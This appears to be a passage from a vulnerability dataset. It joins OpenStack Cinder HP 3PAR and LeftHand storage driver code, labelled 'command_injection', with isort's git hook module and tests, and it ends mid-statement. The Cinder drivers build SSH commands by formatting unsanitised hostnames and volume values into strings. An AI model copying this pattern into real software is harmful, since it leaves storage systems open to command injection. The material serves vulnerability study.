                ip = ip_addr.split(':')
                if len(ip) == 1:
                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}
                elif len(ip) == 2:
                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}
                else:
                    msg = _(""Invalid IP address format '%s'"") % ip_addr
                    LOG.warn(msg)

        # add the single value iscsi_ip_address option to the IP dictionary.
        # This way we can see if it's a valid iSCSI IP. If it's not valid,
        # we won't use it and won't bother to report it, see below
        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):
            ip = self.configuration.iscsi_ip_address
            ip_port = self.configuration.iscsi_port
            temp_iscsi_ip[ip] = {'ip_port': ip_port}

        # get all the valid iSCSI ports from 3PAR
        # when found, add the valid iSCSI ip, ip port, iqn and nsp
        # to the iSCSI IP dictionary
        # ...this will also make sure ssh works.
        iscsi_ports = self.common.get_ports()['iSCSI']
        for (ip, iscsi_info) in iscsi_ports.iteritems():
            if ip in temp_iscsi_ip:
                ip_port = temp_iscsi_ip[ip]['ip_port']
                self.iscsi_ips[ip] = {'ip_port': ip_port,
                                      'nsp': iscsi_info['nsp'],
                                      'iqn': iscsi_info['iqn']
                                      }
                del temp_iscsi_ip[ip]

        # if the single value iscsi_ip_address option is still in the
        # temp dictionary it's because it defaults to $my_ip which doesn't
        # make sense in this context. So, if present, remove it and move on.
        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):
            del temp_iscsi_ip[self.configuration.iscsi_ip_address]

        # lets see if there are invalid iSCSI IPs left in the temp dict
        if len(temp_iscsi_ip) > 0:
            msg = _(""Found invalid iSCSI IP address(s) in configuration ""
                    ""option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'"") % \
                   ("", "".join(temp_iscsi_ip))
            LOG.warn(msg)

        if not len(self.iscsi_ips) > 0:
            msg = _('At least one valid iSCSI IP address must be set.')
            raise exception.InvalidInput(reason=(msg))

        self.common.do_setup(context)

    def check_for_setup_error(self):
        """"""Returns an error if prerequisites aren't met.""""""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()

        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        """"""Clone an existing volume.""""""
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()

        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """"""
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """"""
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        Steps to export a volume on 3PAR
          * Get the 3PAR iSCSI iqn
          * Create a host on the 3par
          * create vlun on the 3par
        """"""
        self.common.client_login()

        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        self.common.client_logout()

        iscsi_ip = self._get_iscsi_ip(host['name'])
        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']
        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']
        info = {'driver_volume_type': 'iscsi',
                'data': {'target_portal': ""%s:%s"" %
                         (iscsi_ip, iscsi_ip_port),
                         'target_iqn': iscsi_target_iqn,
                         'target_lun': vlun['lun'],
                         'target_discovered': True
                         }
                }
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """"""Driver entry point to unattach a volume from an instance.""""""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['initiator'])
        self.common.client_logout()

    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):
        """"""Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same iqn but with a different hostname, return the hostname
        used by 3PAR.
        """"""
        cmd = 'createhost -iscsi -persona %s -domain %s %s %s' % \
              (persona_id, domain, hostname, iscsi_iqn)
        out = self.common._cli_run(cmd, None)
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)
        return hostname

    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):
        # when using -add, you can not send the persona or domain options
        self.common._cli_run('createhost -iscsi -add %s %s'
                             % (hostname, iscsi_iqn), None)

    def _create_host(self, volume, connector):
        """"""Creates or modifies existing 3PAR host.""""""
        # make sure we don't have the host already
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['iSCSIPaths']:
                self._modify_3par_iscsi_host(hostname, connector['initiator'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_iscsi_host(hostname,
                                                    connector['initiator'],
                                                    domain,
                                                    persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def _get_iscsi_ip(self, hostname):
        """"""Get an iSCSI IP address to use.

        Steps to determine which IP address to use.
          * If only one IP address, return it
          * If there is an active vlun, return the IP associated with it
          * Return IP with fewest active vluns
        """"""
        if len(self.iscsi_ips) == 1:
            return self.iscsi_ips.keys()[0]

        # if we currently have an active port, use it
        nsp = self._get_active_nsp(hostname)

        if nsp is None:
            # no active vlun, find least busy port
            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())
            if nsp is None:
                msg = _(""Least busy iSCSI port not found, ""
                        ""using first iSCSI port in list."")
                LOG.warn(msg)
                return self.iscsi_ips.keys()[0]

        return self._get_ip_using_nsp(nsp)

    def _get_iscsi_nsps(self):
        """"""Return the list of candidate nsps.""""""
        nsps = []
        for value in self.iscsi_ips.values():
            nsps.append(value['nsp'])
        return nsps

    def _get_ip_using_nsp(self, nsp):
        """"""Return IP assiciated with given nsp.""""""
        for (key, value) in self.iscsi_ips.items():
            if value['nsp'] == nsp:
                return key

    def _get_active_nsp(self, hostname):
        """"""Return the active nsp, if one exists, for the given host.""""""
        result = self.common._cli_run('showvlun -a -host %s' % hostname, None)
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                info = line.split("","")
                if info and len(info) > 4:
                    return info[4]

    def _get_least_used_nsp(self, nspss):
        """"""""Return the nsp that has the fewest active vluns.""""""
        # return only the nsp (node:server:port)
        result = self.common._cli_run('showvlun -a -showcols Port', None)

        # count the number of nsps (there is 1 for each active vlun)
        nsp_counts = {}
        for nsp in nspss:
            # initialize counts to zero
            nsp_counts[nsp] = 0

        current_least_used_nsp = None
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                nsp = line.strip()
                if nsp in nsp_counts:
                    nsp_counts[nsp] = nsp_counts[nsp] + 1

            # identify key (nsp) of least used nsp
            current_smallest_count = sys.maxint
            for (nsp, count) in nsp_counts.iteritems():
                if count < current_smallest_count:
                    current_least_used_nsp = nsp
                    current_smallest_count = count

        return current_least_used_nsp

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)
/n/n/n/cinder/volume/drivers/san/hp_lefthand.py/n/n#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
""""""
HP Lefthand SAN ISCSI Driver.

The driver communicates to the backend aka Cliq via SSH to perform all the
operations on the SAN.
""""""
from lxml import etree

from cinder import exception
from cinder.openstack.common import log as logging
from cinder.volume.drivers.san.san import SanISCSIDriver


LOG = logging.getLogger(__name__)


class HpSanISCSIDriver(SanISCSIDriver):
    """"""Executes commands relating to HP/Lefthand SAN ISCSI volumes.

    We use the CLIQ interface, over SSH.

    Rough overview of CLIQ commands used:

    :createVolume:    (creates the volume)

    :getVolumeInfo:    (to discover the IQN etc)

    :getClusterInfo:    (to discover the iSCSI target IP address)

    :assignVolumeChap:    (exports it with CHAP security)

    The 'trick' here is that the HP SAN enforces security by default, so
    normally a volume mount would need both to configure the SAN in the volume
    layer and do the mount on the compute layer.  Multi-layer operations are
    not catered for at the moment in the cinder architecture, so instead we
    share the volume using CHAP at volume creation time.  Then the mount need
    only use those CHAP credentials, so can take place exclusively in the
    compute layer.
    """"""

    device_stats = {}

    def __init__(self, *args, **kwargs):
        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)
        self.cluster_vip = None

    def _cliq_run(self, verb, cliq_args, check_exit_code=True):
        """"""Runs a CLIQ command over SSH, without doing any result parsing""""""
        cliq_arg_strings = []
        for k, v in cliq_args.items():
            cliq_arg_strings.append("" %s=%s"" % (k, v))
        cmd = verb + ''.join(cliq_arg_strings)

        return self._run_ssh(cmd, check_exit_code)

    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):
        """"""Runs a CLIQ command over SSH, parsing and checking the output""""""
        cliq_args['output'] = 'XML'
        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)

        LOG.debug(_(""CLIQ command returned %s""), out)

        result_xml = etree.fromstring(out)
        if check_cliq_result:
            response_node = result_xml.find(""response"")
            if response_node is None:
                msg = (_(""Malformed response to CLIQ command ""
                         ""%(verb)s %(cliq_args)s. Result=%(out)s"") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

            result_code = response_node.attrib.get(""result"")

            if result_code != ""0"":
                msg = (_(""Error running CLIQ command %(verb)s %(cliq_args)s. ""
                         "" Result=%(out)s"") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

        return result_xml

    def _cliq_get_cluster_info(self, cluster_name):
        """"""Queries for info about the cluster (including IP)""""""
        cliq_args = {}
        cliq_args['clusterName'] = cluster_name
        cliq_args['searchDepth'] = '1'
        cliq_args['verbose'] = '0'

        result_xml = self._cliq_run_xml(""getClusterInfo"", cliq_args)

        return result_xml

    def _cliq_get_cluster_vip(self, cluster_name):
        """"""Gets the IP on which a cluster shares iSCSI volumes""""""
        cluster_xml = self._cliq_get_cluster_info(cluster_name)

        vips = []
        for vip in cluster_xml.findall(""response/cluster/vip""):
            vips.append(vip.attrib.get('ipAddress'))

        if len(vips) == 1:
            return vips[0]

        _xml = etree.tostring(cluster_xml)
        msg = (_(""Unexpected number of virtual ips for cluster ""
                 "" %(cluster_name)s. Result=%(_xml)s"") %
               {'cluster_name': cluster_name, '_xml': _xml})
        raise exception.VolumeBackendAPIException(data=msg)

    def _cliq_get_volume_info(self, volume_name):
        """"""Gets the volume info, including IQN""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume_name
        result_xml = self._cliq_run_xml(""getVolumeInfo"", cliq_args)

        # Result looks like this:
        #<gauche version=""1.0"">
        #  <response description=""Operation succeeded."" name=""CliqSuccess""
        #            processingTime=""87"" result=""0"">
        #    <volume autogrowPages=""4"" availability=""online"" blockSize=""1024""
        #       bytesWritten=""0"" checkSum=""false"" clusterName=""Cluster01""
        #       created=""2011-02-08T19:56:53Z"" deleting=""false"" description=""""
        #       groupName=""Group01"" initialQuota=""536870912"" isPrimary=""true""
        #       iscsiIqn=""iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b""
        #       maxSize=""6865387257856"" md5=""9fa5c8b2cca54b2948a63d833097e1ca""
        #       minReplication=""1"" name=""vol-b"" parity=""0"" replication=""2""
        #       reserveQuota=""536870912"" scratchQuota=""4194304""
        #       serialNumber=""9fa5c8b2cca54b2948a63d833097e1ca0000000000006316""
        #       size=""1073741824"" stridePages=""32"" thinProvision=""true"">
        #      <status description=""OK"" value=""2""/>
        #      <permission access=""rw""
        #            authGroup=""api-34281B815713B78-(trimmed)51ADD4B7030853AA7""
        #            chapName=""chapusername"" chapRequired=""true"" id=""25369""
        #            initiatorSecret="""" iqn="""" iscsiEnabled=""true""
        #            loadBalance=""true"" targetSecret=""supersecret""/>
        #    </volume>
        #  </response>
        #</gauche>

        # Flatten the nodes into a dictionary; use prefixes to avoid collisions
        volume_attributes = {}

        volume_node = result_xml.find(""response/volume"")
        for k, v in volume_node.attrib.items():
            volume_attributes[""volume."" + k] = v

        status_node = volume_node.find(""status"")
        if status_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes[""status."" + k] = v

        # We only consider the first permission node
        permission_node = volume_node.find(""permission"")
        if permission_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes[""permission."" + k] = v

        LOG.debug(_(""Volume info: %(volume_name)s => %(volume_attributes)s"") %
                  {'volume_name': volume_name,
                   'volume_attributes': volume_attributes})
        return volume_attributes

    def create_volume(self, volume):
        """"""Creates a volume.""""""
        cliq_args = {}
        cliq_args['clusterName'] = self.configuration.san_clustername

        if self.configuration.san_thin_provision:
            cliq_args['thinProvision'] = '1'
        else:
            cliq_args['thinProvision'] = '0'

        cliq_args['volumeName'] = volume['name']
        if int(volume['size']) == 0:
            cliq_args['size'] = '100MB'
        else:
            cliq_args['size'] = '%sGB' % volume['size']

        self._cliq_run_xml(""createVolume"", cliq_args)

        volume_info = self._cliq_get_volume_info(volume['name'])
        cluster_name = volume_info['volume.clusterName']
        iscsi_iqn = volume_info['volume.iscsiIqn']

        #TODO(justinsb): Is this always 1? Does it matter?
        cluster_interface = '1'

        if not self.cluster_vip:
            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)
        iscsi_portal = self.cluster_vip + "":3260,"" + cluster_interface

        model_update = {}

        # NOTE(jdg): LH volumes always at lun 0 ?
        model_update['provider_location'] = (""%s %s %s"" %
                                             (iscsi_portal,
                                              iscsi_iqn,
                                              0))

        return model_update

    def create_volume_from_snapshot(self, volume, snapshot):
        """"""Creates a volume from a snapshot.""""""
        raise NotImplementedError()

    def create_snapshot(self, snapshot):
        """"""Creates a snapshot.""""""
        raise NotImplementedError()

    def delete_volume(self, volume):
        """"""Deletes a volume.""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['prompt'] = 'false'  # Don't confirm
        try:
            volume_info = self._cliq_get_volume_info(volume['name'])
        except exception.ProcessExecutionError:
            LOG.error(""Volume did not exist. It will not be deleted"")
            return
        self._cliq_run_xml(""deleteVolume"", cliq_args)

    def local_path(self, volume):
        msg = _(""local_path not supported"")
        raise exception.VolumeBackendAPIException(data=msg)

    def initialize_connection(self, volume, connector):
        """"""Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host. HP VSA requires a volume to be assigned
        to a server.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        """"""
        self._create_server(connector)
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml(""assignVolumeToServer"", cliq_args)

        iscsi_properties = self._get_iscsi_properties(volume)
        return {
            'driver_volume_type': 'iscsi',
            'data': iscsi_properties
        }

    def _create_server(self, connector):
        cliq_args = {}
        cliq_args['serverName'] = connector['host']
        out = self._cliq_run_xml(""getServerInfo"", cliq_args, False)
        response = out.find(""response"")
        result = response.attrib.get(""result"")
        if result != '0':
            cliq_args = {}
            cliq_args['serverName'] = connector['host']
            cliq_args['initiator'] = connector['initiator']
            self._cliq_run_xml(""createServer"", cliq_args)

    def terminate_connection(self, volume, connector, **kwargs):
        """"""Unassign the volume from the host.""""""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml(""unassignVolumeToServer"", cliq_args)

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_backend_status()

        return self.device_stats

    def _update_backend_status(self):
        data = {}
        backend_name = self.configuration.safe_get('volume_backend_name')
        data['volume_backend_name'] = backend_name or self.__class__.__name__
        data['driver_version'] = '1.0'
        data['reserved_percentage'] = 0
        data['storage_protocol'] = 'iSCSI'
        data['vendor_name'] = 'Hewlett-Packard'

        result_xml = self._cliq_run_xml(""getClusterInfo"", {})
        cluster_node = result_xml.find(""response/cluster"")
        total_capacity = cluster_node.attrib.get(""spaceTotal"")
        free_capacity = cluster_node.attrib.get(""unprovisionedSpace"")
        GB = 1073741824

        data['total_capacity_gb'] = int(total_capacity) / GB
        data['free_capacity_gb'] = int(free_capacity) / GB
        self.device_stats = data
/n/n/n",1,command_injection
8,196,1ab38f4f7840a3c19bf961a24630a992a8373a76,"isort/hooks.py/n/n""""""isort.py.

Defines a git hook to allow pre-commit warnings and errors about import order.

usage:
    exit_code = git_hook(strict=True|False, modify=True|False)

Copyright (C) 2015  Helen Sherwood-Taylor

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
documentation files (the ""Software""), to deal in the Software without restriction, including without limitation
the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or
substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED
TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF
CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.

""""""
import subprocess
from typing import List

from isort import SortImports


def get_output(command: List[str]) -> str:
    """"""
    Run a command and return raw output

    :param str command: the command to run
    :returns: the stdout output of the command
    """"""
    result = subprocess.run(command, stdout=subprocess.PIPE, check=True)
    return result.stdout.decode()


def get_lines(command: List[str]) -> List[str]:
    """"""
    Run a command and return lines of output

    :param str command: the command to run
    :returns: list of whitespace-stripped lines output by command
    """"""
    stdout = get_output(command)
    return [line.strip() for line in stdout.splitlines()]


def git_hook(strict=False, modify=False):
    """"""
    Git pre-commit hook to check staged files for isort errors

    :param bool strict - if True, return number of errors on exit,
        causing the hook to fail. If False, return zero so it will
        just act as a warning.
    :param bool modify - if True, fix the sources if they are not
        sorted properly. If False, only report result without
        modifying anything.

    :return number of errors if in strict mode, 0 otherwise.
    """"""

    # Get list of files modified and staged
    diff_cmd = [""git"", ""diff-index"", ""--cached"", ""--name-only"", ""--diff-filter=ACMRTUXB HEAD""]
    files_modified = get_lines(diff_cmd)

    errors = 0
    for filename in files_modified:
        if filename.endswith('.py'):
            # Get the staged contents of the file
            staged_cmd = [""git"", ""show"", "":%s"" % filename]
            staged_contents = get_output(staged_cmd)

            sort = SortImports(
                file_path=filename,
                file_contents=staged_contents,
                check=True
            )

            if sort.incorrectly_sorted:
                errors += 1
                if modify:
                    SortImports(
                        file_path=filename,
                        file_contents=staged_contents,
                        check=False,
                    )

    return errors if strict else 0
/n/n/ntest_isort.py/n/n""""""test_isort.py.

Tests all major functionality of the isort library
Should be ran using py.test by simply running py.test in the isort project directory

Copyright (C) 2013  Timothy Edmund Crosley

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
documentation files (the ""Software""), to deal in the Software without restriction, including without limitation
the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or
substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED
TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF
CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.

""""""
import io
import os
import os.path
import posixpath
import subprocess
import sys
import sysconfig
from tempfile import NamedTemporaryFile
from typing import Any, Dict, List

import py
import pytest

from isort import finders, main, settings
from isort.main import is_python_file, SortImports
from isort.settings import WrapModes
from isort.utils import exists_case_sensitive

try:
    import toml
except ImportError:
    toml = None

TEST_DEFAULT_CONFIG = """"""
[*.py]
max_line_length = 120
indent_style = space
indent_size = 4
known_first_party = isort
known_third_party = kate
ignore_frosted_errors = E103
skip = build,.tox,venv
balanced_wrapping = true
not_skip = __init__.py
""""""
SHORT_IMPORT = ""from third_party import lib1, lib2, lib3, lib4""
SINGLE_FROM_IMPORT = ""from third_party import lib1""
SINGLE_LINE_LONG_IMPORT = ""from third_party import lib1, lib2, lib3, lib4, lib5, lib5ab""
REALLY_LONG_IMPORT = (""from third_party import lib1, lib2, lib3, lib4, lib5, lib6, lib7, lib8, lib9, lib10, lib11,""
                      ""lib12, lib13, lib14, lib15, lib16, lib17, lib18, lib20, lib21, lib22"")
REALLY_LONG_IMPORT_WITH_COMMENT = (""from third_party import lib1, lib2, lib3, lib4, lib5, lib6, lib7, lib8, lib9, ""
                                   ""lib10, lib11, lib12, lib13, lib14, lib15, lib16, lib17, lib18, lib20, lib21, lib22""
                                   "" # comment"")


@pytest.fixture(scope=""session"", autouse=True)
def default_settings_path(tmpdir_factory):
    config_dir = tmpdir_factory.mktemp('config')
    config_file = config_dir.join('.editorconfig').strpath
    with open(config_file, 'w') as editorconfig:
        editorconfig.write(TEST_DEFAULT_CONFIG)

    with config_dir.as_cwd():
        yield config_dir.strpath


def test_happy_path():
    """"""Test the most basic use case, straight imports no code, simply not organized by category.""""""
    test_input = (""import sys\n""
                  ""import os\n""
                  ""import myproject.test\n""
                  ""import django.settings"")
    test_output = SortImports(file_contents=test_input, known_third_party=['django']).output
    assert test_output == (""import os\n""
                           ""import sys\n""
                           ""\n""
                           ""import django.settings\n""
                           ""\n""
                           ""import myproject.test\n"")


def test_code_intermixed():
    """"""Defines what should happen when isort encounters imports intermixed with
    code.

    (it should pull them all to the top)

    """"""
    test_input = (""import sys\n""
                  ""print('yo')\n""
                  ""print('I like to put code between imports cause I want stuff to break')\n""
                  ""import myproject.test\n"")
    test_output = SortImports(file_contents=test_input).output
    assert test_output == (""import sys\n""
                           ""\n""
                           ""import myproject.test\n""
                           ""\n""
                           ""print('yo')\n""
                           ""print('I like to put code between imports cause I want stuff to break')\n"")


def test_correct_space_between_imports():
    """"""Ensure after imports a correct amount of space (in newlines) is
    enforced.

    (2 for method, class, or decorator definitions 1 for anything else)

    """"""
    test_input_method = (""import sys\n""
                         ""def my_method():\n""
                         ""    print('hello world')\n"")
    test_output_method = SortImports(file_contents=test_input_method).output
    assert test_output_method == (""import sys\n""
                                  ""\n""
                                  ""\n""
                                  ""def my_method():\n""
                                  ""    print('hello world')\n"")

    test_input_decorator = (""import sys\n""
                            ""@my_decorator\n""
                            ""def my_method():\n""
                            ""    print('hello world')\n"")
    test_output_decorator = SortImports(file_contents=test_input_decorator).output
    assert test_output_decorator == (""import sys\n""
                                     ""\n""
                                     ""\n""
                                     ""@my_decorator\n""
                                     ""def my_method():\n""
                                     ""    print('hello world')\n"")

    test_input_class = (""import sys\n""
                        ""class MyClass(object):\n""
                        ""    pass\n"")
    test_output_class = SortImports(file_contents=test_input_class).output
    assert test_output_class == (""import sys\n""
                                 ""\n""
                                 ""\n""
                                 ""class MyClass(object):\n""
                                 ""    pass\n"")

    test_input_other = (""import sys\n""
                        ""print('yo')\n"")
    test_output_other = SortImports(file_contents=test_input_other).output
    assert test_output_other == (""import sys\n""
                                 ""\n""
                                 ""print('yo')\n"")


def test_sort_on_number():
    """"""Ensure numbers get sorted logically (10 > 9 not the other way around)""""""
    test_input = (""import lib10\n""
                  ""import lib9\n"")
    test_output = SortImports(file_contents=test_input).output
    assert test_output == (""import lib9\n""
                           ""import lib10\n"")


def test_line_length():
    """"""Ensure isort enforces the set line_length.""""""
    assert len(SortImports(file_contents=REALLY_LONG_IMPORT, line_length=80).output.split(""\n"")[0]) <= 80
    assert len(SortImports(file_contents=REALLY_LONG_IMPORT, line_length=120).output.split(""\n"")[0]) <= 120

    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, line_length=42).output
    assert test_output == (""from third_party import (lib1, lib2, lib3,\n""
                           ""                         lib4, lib5, lib6,\n""
                           ""                         lib7, lib8, lib9,\n""
                           ""                         lib10, lib11,\n""
                           ""                         lib12, lib13,\n""
                           ""                         lib14, lib15,\n""
                           ""                         lib16, lib17,\n""
                           ""                         lib18, lib20,\n""
                           ""                         lib21, lib22)\n"")

    TEST_INPUT = ('from django.contrib.gis.gdal.field import (\n'
                  '    OFTDate, OFTDateTime, OFTInteger, OFTInteger64, OFTReal, OFTString,\n'
                  '    OFTTime,\n'
                  ')\n')  # Test case described in issue #654
    assert SortImports(file_contents=TEST_INPUT, include_trailing_comma=True, line_length=79,
                       multi_line_output=WrapModes.VERTICAL_GRID_GROUPED, balanced_wrapping=False).output == TEST_INPUT

    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, line_length=42, wrap_length=32).output
    assert test_output == (""from third_party import (lib1,\n""
                           ""                         lib2,\n""
                           ""                         lib3,\n""
                           ""                         lib4,\n""
                           ""                         lib5,\n""
                           ""                         lib6,\n""
                           ""                         lib7,\n""
                           ""                         lib8,\n""
                           ""                         lib9,\n""
                           ""                         lib10,\n""
                           ""                         lib11,\n""
                           ""                         lib12,\n""
                           ""                         lib13,\n""
                           ""                         lib14,\n""
                           ""                         lib15,\n""
                           ""                         lib16,\n""
                           ""                         lib17,\n""
                           ""                         lib18,\n""
                           ""                         lib20,\n""
                           ""                         lib21,\n""
                           ""                         lib22)\n"")


def test_output_modes():
    """"""Test setting isort to use various output modes works as expected""""""
    test_output_grid = SortImports(file_contents=REALLY_LONG_IMPORT,
                                   multi_line_output=WrapModes.GRID, line_length=40).output
    assert test_output_grid == (""from third_party import (lib1, lib2,\n""
                                ""                         lib3, lib4,\n""
                                ""                         lib5, lib6,\n""
                                ""                         lib7, lib8,\n""
                                ""                         lib9, lib10,\n""
                                ""                         lib11, lib12,\n""
                                ""                         lib13, lib14,\n""
                                ""                         lib15, lib16,\n""
                                ""                         lib17, lib18,\n""
                                ""                         lib20, lib21,\n""
                                ""                         lib22)\n"")

    test_output_vertical = SortImports(file_contents=REALLY_LONG_IMPORT,
                                       multi_line_output=WrapModes.VERTICAL, line_length=40).output
    assert test_output_vertical == (""from third_party import (lib1,\n""
                                    ""                         lib2,\n""
                                    ""                         lib3,\n""
                                    ""                         lib4,\n""
                                    ""                         lib5,\n""
                                    ""                         lib6,\n""
                                    ""                         lib7,\n""
                                    ""                         lib8,\n""
                                    ""                         lib9,\n""
                                    ""                         lib10,\n""
                                    ""                         lib11,\n""
                                    ""                         lib12,\n""
                                    ""                         lib13,\n""
                                    ""                         lib14,\n""
                                    ""                         lib15,\n""
                                    ""                         lib16,\n""
                                    ""                         lib17,\n""
                                    ""                         lib18,\n""
                                    ""                         lib20,\n""
                                    ""                         lib21,\n""
                                    ""                         lib22)\n"")

    comment_output_vertical = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,
                                          multi_line_output=WrapModes.VERTICAL, line_length=40).output
    assert comment_output_vertical == (""from third_party import (lib1,  # comment\n""
                                       ""                         lib2,\n""
                                       ""                         lib3,\n""
                                       ""                         lib4,\n""
                                       ""                         lib5,\n""
                                       ""                         lib6,\n""
                                       ""                         lib7,\n""
                                       ""                         lib8,\n""
                                       ""                         lib9,\n""
                                       ""                         lib10,\n""
                                       ""                         lib11,\n""
                                       ""                         lib12,\n""
                                       ""                         lib13,\n""
                                       ""                         lib14,\n""
                                       ""                         lib15,\n""
                                       ""                         lib16,\n""
                                       ""                         lib17,\n""
                                       ""                         lib18,\n""
                                       ""                         lib20,\n""
                                       ""                         lib21,\n""
                                       ""                         lib22)\n"")

    test_output_hanging_indent = SortImports(file_contents=REALLY_LONG_IMPORT,
